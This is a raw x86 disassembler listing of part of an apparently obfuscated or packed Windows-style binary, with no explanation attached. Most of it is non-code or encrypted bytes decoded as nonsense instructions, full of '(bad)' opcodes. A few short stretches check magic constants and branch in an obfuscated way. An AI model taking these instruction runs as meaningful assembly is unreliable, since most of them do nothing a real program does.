  4018f6:	pop    ecx
  4018f7:	lds    ecx,FWORD PTR [edi-0x25a2073b]
  4018fd:	out    0xde,eax
  4018ff:	div    DWORD PTR [edx-0x56]
  401902:	dec    ecx
  401903:	shl    BYTE PTR [eax-0x2b],cl
  401906:	pop    ds
  401907:	mov    ebp,0x102990ec
  40190c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40190d:	test   eax,0xaf51c101
  401912:	aas    
  401913:	imul   esi,DWORD PTR [ebx+ebp*1+0x60feed49],0x54
  40191b:	loop   0x401976
  40191d:	fnstcw WORD PTR [esp+ebx*2+0x37]
  401921:	sbb    al,0x23
  401923:	or     cl,BYTE PTR [esi+0xb]
  401926:	xor    al,0x97
  401928:	lods   al,BYTE PTR ds:[esi]
  401929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40192a:	fild   QWORD PTR [ebx]
  40192c:	pop    edx
  40192d:	jge    0x401966
  40192f:	or     BYTE PTR [ecx],bl
  401931:	fstp   DWORD PTR [edx-0x11]
  401934:	jmp    0x3312:0x99e303cd
  40193b:	bound  eax,QWORD PTR [ecx]
  40193d:	in     eax,dx
  40193e:	inc    esi
  40193f:	fyl2x  
  401941:	arpl   WORD PTR [esi],ax
  401943:	popf   
  401944:	jl     0x4019c1
  401946:	shl    DWORD PTR [ebx],cl
  401948:	adc    eax,0x896875b3
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xea7bf628
  401994:	aas    
  401995:	mov    ebx,0x707a7020
  40199a:	jo     0x401a0c
  40199c:	jle    0x401a0e
  40199e:	jo     0x4019ce
  4019a0:	push   es
  4019a1:	inc    ebp
  4019a2:	pushf  
  4019a3:	inc    edx
  4019a4:	push   edi
  4019a5:	bound  ebp,QWORD PTR [ebx]
  4019a7:	sbb    BYTE PTR [ebp-0x602b3b69],0x66
  4019ae:	mov    ds:0x1d6a36ec,al
  4019b3:	xchg   ebp,eax
  4019b4:	mov    bh,0x37
  4019b6:	adc    al,0x53
  4019b8:	std    
  4019b9:	mov    ebp,0x2a481907
  4019be:	mov    bl,0x47
  4019c0:	push   esp
  4019c1:	daa    
  4019c2:	inc    BYTE PTR [eax]
  4019c4:	dec    ecx
  4019c5:	in     eax,0x28
  4019c7:	lods   al,BYTE PTR ds:[esi]
  4019c8:	stos   BYTE PTR es:[edi],al
  4019c9:	or     DWORD PTR [ecx+ecx*4],ebx
  4019cc:	das    
  4019cd:	stos   DWORD PTR es:[edi],eax
  4019ce:	loop   0x4019ed
  4019d0:	dec    edi
  4019d1:	cld    
  4019d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019d3:	(bad)  [ecx]
  4019d5:	outs   dx,BYTE PTR ds:[esi]
  4019d6:	frstor [ebx+0x4c]
  4019d9:	sub    al,0x61
  4019db:	cmp    DWORD PTR [ecx+0x4],ebx
  4019de:	mov    ds:0xe677705a,eax
  4019e3:	add    al,al
  4019e5:	jo     0x401a3f
  4019e7:	inc    edi
  4019e8:	mov    bh,0x30
  4019ea:	enter  0xf488,0xea
  4019ee:	pop    es
  4019ef:	scas   eax,DWORD PTR es:[edi]
  4019f0:	dec    eax
  4019f1:	cmc    
  4019f2:	jge    0x401a26
  4019f4:	pop    ecx
  4019f5:	add    BYTE PTR [esi+0x2b],bh
  4019f8:	add    eax,eax
  4019fa:	or     BYTE PTR [edx-0x7e],bl
  4019fd:	retf   
  4019fe:	bound  edx,QWORD PTR [edi-0xa888451]
  401a04:	sub    eax,esi
  401a06:	fdiv   DWORD PTR [esi-0x2088774b]
  401a0c:	repnz test DWORD PTR [edi+0x9],edx
  401a10:	ret    
  401a11:	cld    
  401a12:	int3   
  401a13:	test   al,0x68
  401a15:	mov    bl,0xbe
  401a17:	mov    ch,0xab
  401a19:	fs pop edx
  401a1b:	lahf   
  401a1c:	jp     0x401a57
  401a1e:	jecxz  0x4019b2
  401a20:	mov    edi,0x4727125
  401a25:	in     eax,dx
  401a26:	into   
  401a27:	push   ss
  401a28:	push   ss
  401a29:	pusha  
  401a2a:	cmp    al,0xd9
  401a2c:	sub    ebp,DWORD PTR [esi+edx*4]
  401a2f:	dec    edi
  401a30:	sbb    DWORD PTR [esi+0x57],ecx
  401a33:	popf   
  401a34:	mov    bl,0xe9
  401a36:	inc    esp
  401a37:	icebp  
  401a38:	jbe    0x401a00
  401a3a:	test   DWORD PTR [ecx-0x121196a8],ebx
  401a40:	retf   
  401a41:	jb     0x4019f8
  401a43:	adc    BYTE PTR [edx-0x63],bh
  401a46:	rcl    ah,1
  401a48:	adc    ah,dh
  401a4a:	mov    edi,edx
  401a4c:	sahf   
  401a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a4e:	ror    DWORD PTR [edx-0x1b],0xc
  401a52:	cmp    DWORD PTR [ebp+0x34],esp
  401a55:	xor    al,0xdd
  401a57:	idiv   dl
  401a59:	outs   dx,DWORD PTR ds:[esi]
  401a5a:	jecxz  0x401a02
  401a5c:	hlt    
  401a5d:	push   edi
  401a5e:	adc    BYTE PTR ds:[eax+0x2125a29d],ch
  401a65:	xchg   ebx,eax
  401a66:	mov    eax,ds:0x73e80b26
  401a6b:	test   BYTE PTR [eax-0x69fd69e8],cl
  401a71:	out    0x76,al
  401a73:	lahf   
  401a74:	and    ebx,eax
  401a76:	sti    
  401a77:	adc    BYTE PTR [ebx],dh
  401a79:	sbb    eax,0x9ce361d6
  401a7e:	cld    
  401a7f:	inc    esi
  401a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a81:	jmp    0x401ac2
  401a83:	mov    bl,0xb1
  401a85:	mov    ebp,DWORD PTR ss:[esi+0x38b2aada]
  401a8c:	fs mov dh,0x4a
  401a8f:	fdiv   QWORD PTR [edi]
  401a91:	in     al,0xbb
  401a93:	clc    
  401a94:	pop    edi
  401a95:	jle    0x401adb
  401a97:	push   ebp
  401a98:	mov    edi,ecx
  401a9a:	add    ebx,edi
  401a9c:	mov    dh,0xc0
  401a9e:	fisttp WORD PTR [ebp-0x4c]
  401aa1:	or     bl,BYTE PTR [ebp+0x4c]
  401aa4:	cwde   
  401aa5:	sahf   
  401aa6:	push   ebx
  401aa7:	(bad)  
  401aa8:	dec    esp
  401aa9:	std    
  401aaa:	push   ebp
  401aab:	(bad)
  401aae:	stos   DWORD PTR es:[edi],eax
  401aaf:	add    BYTE PTR [ecx],dh
  401ab1:	inc    eax
  401ab2:	les    ecx,FWORD PTR [edi+0x9]
  401ab5:	or     eax,0xbf14b944
  401aba:	pop    edx
  401abb:	adc    eax,0x2c547686
  401ac0:	not    DWORD PTR [esp+edi*4]
  401ac3:	fld    TBYTE PTR [esi-0x7]
  401ac6:	fmul   QWORD PTR [edi]
  401ac8:	push   esp
  401ac9:	add    edx,DWORD PTR [eax-0x73]
  401acc:	neg    BYTE PTR [eax-0x3e]
  401acf:	fcom   QWORD PTR [ecx]
  401ad1:	leave  
  401ad2:	arpl   dx,bx
  401ad4:	jmp    0x43a2:0x1a8dcfeb
  401adb:	shl    BYTE PTR [ecx+edx*8+0x31ac5bc2],1
  401ae2:	add    ah,BYTE PTR [ebx]
  401ae4:	outs   dx,BYTE PTR ds:[esi]
  401ae5:	ret    
  401ae6:	pop    edi
  401ae7:	xor    eax,0x1373da51
  401aec:	das    
  401aed:	add    BYTE PTR [eax],bl
  401aef:	sub    bl,BYTE PTR [eax+0x7d]
  401af2:	push   ebx
  401af3:	outs   dx,DWORD PTR ds:[esi]
  401af4:	sub    eax,0x46f6f871
  401af9:	mov    WORD PTR [ebx-0x648bab1b],cs
  401aff:	or     ebx,ebp
  401b01:	mov    ?,WORD PTR [esi-0x8]
  401b04:	xchg   edx,eax
  401b05:	call   0x3dbb:0xe7e3364e
  401b0c:	xchg   edi,eax
  401b0d:	jmp    0x401b1f
  401b0f:	mov    ecx,0x6f1900b5
  401b14:	pop    edi
  401b15:	mov    dl,0x8
  401b17:	or     ch,ch
  401b19:	popa   
  401b1a:	jo     0x401b33
  401b1c:	(bad)  
  401b1d:	hlt    
  401b1e:	call   0xedc1:0xf79ecbcd
  401b25:	jecxz  0x401ad9
  401b27:	push   eax
  401b28:	ds (bad) 
  401b2a:	mov    edx,0x184b77f
  401b2f:	or     al,0x7e
  401b31:	fisttp WORD PTR es:[edx+ecx*4+0x3b]
  401b36:	(bad)  
  401b37:	pop    ebx
  401b38:	mov    ds:0x3401cf48,al
  401b3d:	cvttps2pi mm1,QWORD PTR [esi-0x36]
  401b41:	xchg   BYTE PTR ds:0x82d6e36f,bl
  401b47:	retf   0x3fc5
  401b4a:	or     BYTE PTR [esi],bh
  401b4c:	inc    esi
  401b4d:	mov    dl,0x8b
  401b4f:	popf   
  401b50:	int    0x82
  401b52:	xor    eax,0x6c3e6a48
  401b57:	add    BYTE PTR [ecx+ebx*4-0x4e0c99a9],ah
  401b5e:	jnp    0x401bb7
  401b60:	ret    
  401b61:	adc    al,0x6c
  401b63:	or     al,0x48
  401b65:	dec    edx
  401b66:	mov    eax,0xd38cd18
  401b6b:	mov    edx,0xa0eaf552
  401b70:	out    dx,al
  401b71:	mov    ecx,0xce881ca4
  401b76:	push   edx
  401b77:	adc    edi,DWORD PTR [edi]
  401b79:	sub    ah,BYTE PTR [ebx+0x59]
  401b7c:	pop    ebp
  401b7d:	or     eax,0x891550df
  401b82:	cs retf 0x2b38
  401b86:	and    al,0x7
  401b88:	cmp    dh,BYTE PTR [eax]
  401b8a:	jmp    0xe4f1186c
  401b8f:	scas   al,BYTE PTR es:[edi]
  401b90:	push   esp
  401b91:	xchg   di,ax
  401b93:	inc    ebx
  401b94:	int    0x40
  401b96:	mov    eax,ds:0x8492ac19
  401b9b:	loope  0x401bf4
  401b9d:	sub    BYTE PTR [ecx-0x740fba75],bl
  401ba3:	adc    BYTE PTR [ecx-0x2e],ch
  401ba6:	in     al,dx
  401ba7:	test   eax,0x1089f89e
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,BYTE PTR [edi+0x70e3e329]
  401be1:	js     0x401c53
  401be3:	jo     0x401c55
  401be5:	jle    0x401c57
  401be7:	jo     0x401bdf
  401be9:	popf   
  401bea:	data16 lods al,BYTE PTR ds:[esi]
  401bec:	ret    0x25b3
  401bef:	icebp  
  401bf0:	sub    DWORD PTR [edx-0x346fa78e],ebx
  401bf6:	jecxz  0x401c61
  401bf8:	in     al,0xa6
  401bfa:	inc    ebp
  401bfb:	fcom   DWORD PTR [esi-0x98678b1]
  401c01:	enter  0x82e0,0x38
  401c05:	sbb    dl,BYTE PTR [ebp+0x6c50bdab]
  401c0b:	in     al,0x3
  401c0d:	mov    eax,ds:0x4f1b08d4
  401c12:	test   eax,0x64da1564
  401c17:	mov    cl,BYTE PTR [ecx+0x75816350]
  401c1d:	test   eax,0x5d717b6c
  401c22:	push   esi
  401c23:	jbe    0x401ba5
  401c25:	xlat   BYTE PTR ds:[ebx]
  401c26:	dec    ebp
  401c27:	ss out 0xeb,al
  401c2a:	(bad)  
  401c2c:	jp     0x401c7f
  401c2e:	add    BYTE PTR [eax-0x56],0x83
  401c32:	push   es
  401c33:	add    ecx,DWORD PTR [ecx]
  401c35:	aad    0x13
  401c37:	ret    0x5e39
  401c3a:	lea    ecx,[ecx]
  401c3c:	cmp    dh,BYTE PTR [ecx+ecx*1]
  401c3f:	xchg   ecx,eax
  401c40:	mov    ebp,0xeb356714
  401c45:	retf   0x2a0e
  401c48:	jnp    0x401c78
  401c4a:	mov    dl,0x23
  401c4c:	das    
  401c4d:	mov    edi,0x72d27d6e
  401c52:	pop    eax
  401c53:	mov    ebx,0x8dfcc0aa
  401c58:	aas    
  401c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c5a:	dec    esp
  401c5b:	lea    esi,[ebx+edx*8+0x63]
  401c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c60:	and    edi,0xffffffaf
  401c63:	or     eax,0xdd8d6c43
  401c68:	(bad)  
  401c69:	xor    al,0x81
  401c6b:	ror    BYTE PTR [ecx],cl
  401c6d:	sahf   
  401c6e:	cmp    bh,BYTE PTR [edi+0x7a]
  401c71:	imul   ebx,edi,0x8
  401c74:	mov    eax,DWORD PTR [eax+0x7a3f77f0]
  401c7a:	xchg   esi,eax
  401c7b:	ret    
  401c7c:	data16 icebp 
  401c7e:	fwait
  401c7f:	and    al,cl
  401c81:	inc    ebp
  401c82:	test   BYTE PTR [ebp+eax*2-0x32c0616b],ah
  401c89:	push   edi
  401c8a:	mov    esi,0xf7fddefe
  401c8f:	pop    ebx
  401c90:	pop    ss
  401c91:	add    eax,0x958bf09
  401c96:	(bad)  
  401c97:	jne    0x401cb5
  401c99:	jae    0x401cb1
  401c9b:	push   ebp
  401c9c:	mov    bl,0x6c
  401c9e:	mov    ebx,0x63a94ad0
  401ca3:	and    bl,BYTE PTR [ebp+0x2]
  401ca6:	in     al,dx
  401ca7:	jne    0x401c6f
  401ca9:	ja     0x401cfb
  401cab:	push   edx
  401cac:	inc    esp
  401cad:	mov    eax,ds:0xcde4d062
  401cb2:	stos   BYTE PTR es:[edi],al
  401cb3:	(bad)  
  401cb4:	scas   al,BYTE PTR es:[edi]
  401cb5:	jp     0x401d0d
  401cb7:	cmp    BYTE PTR [edx-0x2e],al
  401cba:	inc    edi
  401cbb:	xor    eax,DWORD PTR [edi-0x3a6b88bd]
  401cc1:	sub    DWORD PTR [ecx-0x78ad46d3],ebx
  401cc7:	(bad)  
  401cc8:	sbb    eax,0xe53737e5
  401ccd:	mov    dl,0xbd
  401ccf:	outs   dx,DWORD PTR ds:[esi]
  401cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd1:	xchg   edi,eax
  401cd2:	xchg   BYTE PTR [edi+eax*8-0x283a3e00],dl
  401cd9:	and    dh,BYTE PTR [ebx+0x62]
  401cdc:	pop    esp
  401cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cde:	es inc ecx
  401ce0:	jg     0x401c7e
  401ce2:	sub    dl,BYTE PTR [ecx+edi*2]
  401ce5:	or     dl,BYTE PTR [esi-0x11]
  401ce8:	push   cs
  401ce9:	(bad)  
  401cea:	leave  
  401ceb:	pop    eax
  401cec:	sub    al,0x80
  401cee:	aad    0xcc
  401cf0:	call   0xf09d5a32
  401cf5:	jge    0x401ca6
  401cf7:	ret    0x249d
  401cfa:	sub    bh,ah
  401cfc:	(bad)  
  401cfd:	icebp  
  401cfe:	pushf  
  401cff:	pop    ss
  401d00:	je     0x401cff
  401d02:	jl     0x401d1d
  401d04:	jo     0x401d36
  401d06:	stos   DWORD PTR es:[edi],eax
  401d07:	call   0xaee485eb
  401d0c:	jle    0x401cae
  401d0e:	sub    ecx,eax
  401d10:	cdq    
  401d11:	and    eax,0xdfd38789
  401d16:	mov    WORD PTR [eax+0x57dbd0b1],fs
  401d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1d:	mov    edx,gs
  401d1f:	sub    edi,DWORD PTR [edi]
  401d21:	enter  0x9718,0x94
  401d25:	out    dx,eax
  401d26:	and    ah,BYTE PTR [edx]
  401d28:	sbb    bl,ch
  401d2a:	jg     0x401d55
  401d2c:	inc    ecx
  401d2d:	out    dx,eax
  401d2e:	mov    al,ds:0xdb6ec883
  401d33:	push   ebp
  401d34:	in     eax,dx
  401d35:	adc    BYTE PTR [ecx],0xea
  401d38:	mov    BYTE PTR [ebx-0x12],dh
  401d3b:	out    0x26,eax
  401d3d:	dec    esi
  401d3e:	jae    0x401d92
  401d40:	push   ecx
  401d41:	repz sbb al,0xe7
  401d44:	retf   
  401d45:	lds    edi,FWORD PTR [esi]
  401d47:	cmp    al,0xa7
  401d49:	sahf   
  401d4a:	clc    
  401d4b:	fistp  QWORD PTR [eax]
  401d4d:	jge    0x401ce6
  401d4f:	int    0x8b
  401d51:	mov    bh,BYTE PTR [ebp+0x3bb14709]
  401d57:	xchg   esi,eax
  401d58:	jg     0x401d62
  401d5a:	and    ch,BYTE PTR [edx+edx*8]
  401d5d:	xchg   ebx,eax
  401d5e:	loop   0x401d2f
  401d60:	xchg   ecx,eax
  401d61:	xor    DWORD PTR [edx-0xf],esi
  401d64:	in     eax,0xa5
  401d66:	dec    edx
  401d67:	cld    
  401d68:	mov    ds:0x147ab3cd,al
  401d6d:	aas    
  401d6e:	mov    eax,ds:0xc8ed68c1
  401d73:	xor    al,0xf4
  401d75:	jle    0x401dca
  401d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d78:	mov    eax,ds:0x6645135d
  401d7d:	inc    edx
  401d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d7f:	inc    edi
  401d80:	adc    eax,0xcb9fd523
  401d85:	in     al,dx
  401d86:	pusha  
  401d87:	icebp  
  401d88:	mov    al,ds:0xfbf41455
  401d8d:	push   edi
  401d8e:	jne    0x401dd4
  401d90:	jbe    0x401d94
  401d92:	outs   dx,DWORD PTR ds:[esi]
  401d93:	pop    es
  401d94:	dec    edx
  401d95:	repnz jecxz 0x401dce
  401d98:	mov    edx,0xa44f1f9
  401d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d9e:	dec    DWORD PTR [edx+0x7b]
  401da1:	addr16 pop edx
  401da3:	ret    
  401da4:	jno    0x401dc3
  401da6:	xor    cl,BYTE PTR [ebx]
  401da8:	sbb    esi,DWORD PTR ds:0x3ce8ae03
  401dae:	mov    edx,?
  401db0:	jmp    0xb0b48d19
  401db5:	addr16 jp 0x401dac
  401db8:	pop    DWORD PTR [esi-0x7a894261]
  401dbe:	jnp    0x401d65
  401dc0:	pushf  
  401dc1:	sub    DWORD PTR [esi],esp
  401dc3:	mov    al,ds:0xb0ed4de4
  401dc8:	pusha  
  401dc9:	icebp  
  401dca:	xchg   edi,eax
  401dcb:	cdq    
  401dcc:	mov    eax,0x11f5b980
  401dd1:	push   es
  401dd2:	jl     0x401d7a
  401dd4:	(bad)  
  401dd6:	mov    dl,0x34
  401dd8:	push   cs
  401dd9:	sub    DWORD PTR [ecx-0x4d],eax
  401ddc:	lahf   
  401ddd:	pop    ecx
  401dde:	and    cl,BYTE PTR [ebp+0x37]
  401de1:	in     al,dx
  401de2:	mov    esp,0xfb29379e
  401de7:	dec    esi
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ecx+esi*2-0x3d],dl
  401e44:	inc    ebp
  401e45:	test   BYTE PTR [eax+0x6],dh
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	push   edi
  401e4f:	xchg   esi,ebx
  401e51:	icebp  
  401e52:	bound  ecx,QWORD PTR ds:0x57021fdb
  401e58:	ds inc edi
  401e5a:	push   0x48
  401e5c:	sub    DWORD PTR [esi-0x1fda50dd],esp
  401e62:	inc    ecx
  401e63:	lds    ebx,FWORD PTR [edi+0x2dc68cde]
  401e69:	sub    eax,0xb36eec7b
  401e6e:	and    ch,dl
  401e70:	ins    DWORD PTR es:[edi],dx
  401e71:	pop    ebx
  401e72:	pushf  
  401e73:	scas   eax,DWORD PTR es:[edi]
  401e74:	xchg   edx,eax
  401e75:	jmp    0xf019b2dd
  401e7a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  401e7c:	inc    ebx
  401e7d:	fdivr  QWORD PTR es:0x77516166
  401e84:	sub    ax,0xce30
  401e88:	call   0x212a:0x16d95467
  401e8f:	cmp    DWORD PTR [esi-0x53bd192],ebp
  401e95:	lods   eax,DWORD PTR ds:[esi]
  401e96:	inc    edx
  401e97:	repz int 0x13
  401e9a:	pushf  
  401e9b:	xor    eax,0xc3d2e079
  401ea0:	jbe    0x401eee
  401ea2:	mov    ch,0x4c
  401ea4:	jb     0x401e60
  401ea6:	jae    0x401f07
  401ea8:	out    dx,al
  401ea9:	cwde   
  401eaa:	mov    eax,0x3e02a98e
  401eaf:	inc    ebp
  401eb0:	scas   eax,DWORD PTR es:[edi]
  401eb1:	retf   
  401eb2:	mov    ah,0xec
  401eb4:	into   
  401eb5:	aad    0x8
  401eb7:	pop    eax
  401eb8:	pop    edx
  401eb9:	scas   al,BYTE PTR es:[edi]
  401eba:	fxch   st(5)
  401ebc:	pusha  
  401ebd:	or     WORD PTR [ebp+edi*2-0x13],di
  401ec2:	sbb    BYTE PTR [esi],bl
  401ec4:	jg     0x401f31
  401ec6:	test   al,0xa
  401ec8:	sti    
  401ec9:	lds    eax,FWORD PTR [edx]
  401ecb:	push   edi
  401ecc:	adc    DWORD PTR [ebx+ebp*2-0x40b83295],edx
  401ed3:	sbb    ch,BYTE PTR [ebx+esi*4]
  401ed6:	test   al,0xd1
  401ed8:	push   ss
  401ed9:	add    eax,0xba335cb5
  401ede:	dec    bh
  401ee0:	dec    edx
  401ee1:	push   ds
  401ee2:	clc    
  401ee3:	test   DWORD PTR [ebp-0x412bf61f],esi
  401ee9:	or     bh,ah
  401eeb:	aam    0xd2
  401eed:	cs aas 
  401eef:	dec    edi
  401ef0:	repz cmp dh,BYTE PTR [edi-0xd]
  401ef4:	mov    esp,0x4289d294
  401ef9:	jp     0x401f30
  401efb:	jl     0x401f1e
  401efd:	mov    DWORD PTR [eax],eax
  401eff:	add    edi,esi
  401f01:	sbb    esp,ecx
  401f03:	sbb    al,0x86
  401f05:	sbb    BYTE PTR [eax+0x9],dh
  401f08:	ficomp DWORD PTR [edi-0x6d]
  401f0b:	mov    eax,0xf710aa11
  401f10:	and    ebp,edi
  401f12:	popa   
  401f13:	fdivp  st(5),st
  401f15:	jp     0x401f64
  401f17:	push   eax
  401f18:	dec    edx
  401f19:	xlat   BYTE PTR ds:[ebx]
  401f1a:	jns    0x401f56
  401f1c:	loop   0x401f01
  401f1e:	test   al,0xd
  401f20:	ins    BYTE PTR es:[edi],dx
  401f21:	jmp    0x109b1d16
  401f26:	fwait
  401f27:	retf   0xf4ea
  401f2a:	or     esi,DWORD PTR [esi-0x78ca8535]
  401f30:	fsubr  DWORD PTR [esi-0x51]
  401f33:	xor    edx,DWORD PTR [esi]
  401f35:	call   0x37db2b96
  401f3a:	les    edx,FWORD PTR [ebp+esi*1+0x515187de]
  401f41:	cmp    ch,bh
  401f43:	adc    DWORD PTR [edx],eax
  401f45:	and    eax,esi
  401f47:	arpl   di,bp
  401f49:	jg     0x401fb8
  401f4b:	xchg   ebp,eax
  401f4c:	imul   BYTE PTR [edi+ebx*2-0x67]
  401f50:	ins    BYTE PTR es:[edi],dx
  401f51:	fmul   DWORD PTR [ebx-0x307b5a28]
  401f57:	enter  0x3aa4,0x2f
  401f5b:	push   edi
  401f5c:	popf   
  401f5d:	outs   dx,DWORD PTR ds:[esi]
  401f5e:	pop    ebp
  401f5f:	xchg   edx,eax
  401f60:	add    esi,DWORD PTR [ecx]
  401f62:	cdq    
  401f63:	sub    edx,DWORD PTR [ebx]
  401f65:	fadd   QWORD PTR [ecx-0x5]
  401f68:	in     eax,dx
  401f69:	mov    ebx,0x3197b7bf
  401f6e:	ret    0xc863
  401f71:	xchg   ebp,eax
  401f72:	sahf   
  401f73:	jo     0x401fa1
  401f75:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f77:	ins    BYTE PTR es:[edi],dx
  401f78:	into   
  401f79:	push   cs
  401f7a:	cmp    eax,0xb9466f27
  401f7f:	or     BYTE PTR [edx-0x5c221d37],dl
  401f85:	mov    cl,0x4a
  401f87:	pop    ss
  401f88:	cmp    DWORD PTR [ebp+0x22],esp
  401f8b:	imul   ecx,DWORD PTR [edx],0xffffffa5
  401f8e:	and    ebp,DWORD PTR [ebp-0x4f]
  401f91:	mov    ds:0x95f54466,al
  401f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f97:	xchg   edi,eax
  401f98:	or     eax,0xae0d1b6c
  401f9d:	mov    dh,0x30
  401f9f:	and    al,0x8e
  401fa1:	add    DWORD PTR [ecx+ecx*1],0xad5be42e
  401fa8:	test   eax,0xdc2cf0c1
  401fad:	pop    ss
  401fae:	ror    BYTE PTR [ecx-0xe5efc9f],cl
  401fb4:	pop    ds
  401fb5:	push   edi
  401fb6:	inc    ebp
  401fb7:	adc    BYTE PTR [esi-0x14],ah
  401fba:	push   ds
  401fbb:	popa   
  401fbc:	inc    ebp
  401fbd:	sub    DWORD PTR [eax+0x5c],0xad1a873c
  401fc4:	(bad)  
  401fc5:	call   0xb96ea2df
  401fca:	inc    esp
  401fcb:	and    DWORD PTR [esi],esi
  401fcd:	or     eax,0x42b90cd5
  401fd2:	mov    ch,0x33
  401fd4:	or     al,0xce
  401fd6:	xor    DWORD PTR [esi-0x29],edi
  401fd9:	jmp    0xa9aece80
  401fde:	xchg   ebp,eax
  401fdf:	push   edi
  401fe0:	repnz ss xchg esi,eax
  401fe3:	sub    eax,0x8b444a24
  401fe8:	pop    ss
  401fe9:	xchg   edi,eax
  401fea:	loope  0x401f88
  401fec:	jge    0x401f74
  401fee:	or     edx,edi
  401ff0:	mov    ch,0xfb
  401ff2:	jecxz  0x40204c
  401ff4:	ins    DWORD PTR es:[edi],dx
  401ff5:	int3   
  401ff6:	bndstx [eax],(bad)
  401ff9:	mov    bh,0xfd
  401ffb:	scas   eax,DWORD PTR es:[edi]
  401ffc:	(bad)  
  401ffd:	in     al,0x72
  401fff:	iret   
  402000:	aad    0xc0
  402002:	lods   eax,DWORD PTR ds:[esi]
  402003:	popa   
  402004:	inc    ebx
  402005:	jb     0x402028
  402007:	shl    DWORD PTR [eax-0x50],0xcc
  40200b:	jb     0x402019
  40200d:	popa   
  40200e:	fbstp  TBYTE PTR [edi-0x21]
  402011:	test   DWORD PTR [edx],edx
  402013:	out    0x96,al
  402015:	mov    esp,ebx
  402017:	loope  0x402048
  402019:	arpl   WORD PTR [edi-0x1c532fb4],dx
  40201f:	cli    
  402020:	adc    DWORD PTR [eax],edx
  402022:	push   ebp
  402023:	hlt    
  402024:	sbb    al,0xc0
  402026:	dec    esp
  402027:	pop    edi
  402028:	mov    esi,0xb949b099
  40202d:	dec    edx
  40202e:	or     bl,BYTE PTR [eax-0x2f4d96b2]
  402034:	aam    0xb7
  402036:	dec    ebx
  402037:	test   BYTE PTR [esp+eax*4+0x29],ch
  40203b:	fnsave [edx+0x6c]
  40203e:	ins    BYTE PTR es:[edi],dx
  40203f:	nop
  402040:	aaa    
  402041:	xor    BYTE PTR es:[eax],bl
  402044:	mov    bl,0xda
  402046:	pop    eax
  402047:	jns    0x402085
  402049:	fidiv  DWORD PTR ds:0x8be46ec7
  40204f:	push   ebp
  402050:	fmul   DWORD PTR [ebx-0x38fc99ee]
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	xor    BYTE PTR [ebp+0x30],0xc1
  40206d:	add    esi,DWORD PTR [eax+0x4]
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	push   0x59
  402078:	xchg   esi,eax
  402079:	ret    
  40207a:	sub    edi,eax
  40207c:	push   edx
  40207d:	jge    0x4020f5
  40207f:	cdq    
  402080:	or     al,0xc2
  402082:	add    bl,0xe2
  402085:	in     eax,dx
  402086:	add    BYTE PTR [edi],cl
